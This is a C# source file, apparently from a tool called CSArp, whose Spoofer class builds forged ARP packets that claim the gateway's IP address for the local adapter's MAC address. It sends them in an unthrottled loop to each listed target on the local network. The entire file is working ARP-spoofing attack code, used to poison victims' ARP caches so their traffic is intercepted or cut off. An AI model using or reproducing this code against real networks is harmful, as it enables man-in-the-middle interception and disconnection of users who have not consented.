using System.Collections.Generic;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap.WinPcap;
using CSArp.Model.Utilities;
using CSArp.Model.Extensions;
using System.Threading.Tasks;
using SharpPcap.Npcap;

namespace CSArp.Model;

public class Spoofer
{
    private const string prefix = "Spoof";
    public NpcapDevice NetworkAdapter { get; set; }

    private Dictionary<IPAddress, PhysicalAddress> engagedclientlist;

    public void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, NpcapDevice networkAdapter)
    {
        engagedclientlist = [];
        if (!networkAdapter.Opened)
            networkAdapter.Open();

        foreach (var target in targetlist)
        {
            //var myipaddress = networkAdapter.ReadCurrentIpV4Address();
            var arppacketforgatewayrequest = new ArpPacket(ArpOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, networkAdapter.MacAddress, target.Key);
            var ethernetpacketforgatewayrequest = new EthernetPacket(networkAdapter.MacAddress, gatewaymacaddress, EthernetType.Arp);
            ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;

            var cts = new CancellationTokenSource();
            TaskBuffer.Add(cts, () => SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, networkAdapter, cts.Token), prefix);
            engagedclientlist.Add(target.Key, target.Value);
        }
    }

    public async ValueTask StopAll()
    {
        await TaskBuffer.StopThreadByName(prefix);
        engagedclientlist?.Clear();
    }

    private static Task SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, NpcapDevice captureDevice, CancellationToken token = default)
    {
        DebugOutput.Print($"Spoofing target {physicalAddress} @ {ipAddress}");
        try
        {
            while (!token.IsCancellationRequested)
                captureDevice.SendPacket(ethernetpacketforgatewayrequest);
        }
        catch (PcapException ex)
        {
            DebugOutput.Print($"PcapException @ DisconnectReconnect.Disconnect() [{ex.Message}]");
        }
        DebugOutput.Print($"Spoofing thread @ DisconnectReconnect.Disconnect() for {physicalAddress} @ {ipAddress} is terminating.");
        return Task.CompletedTask;
    }
}
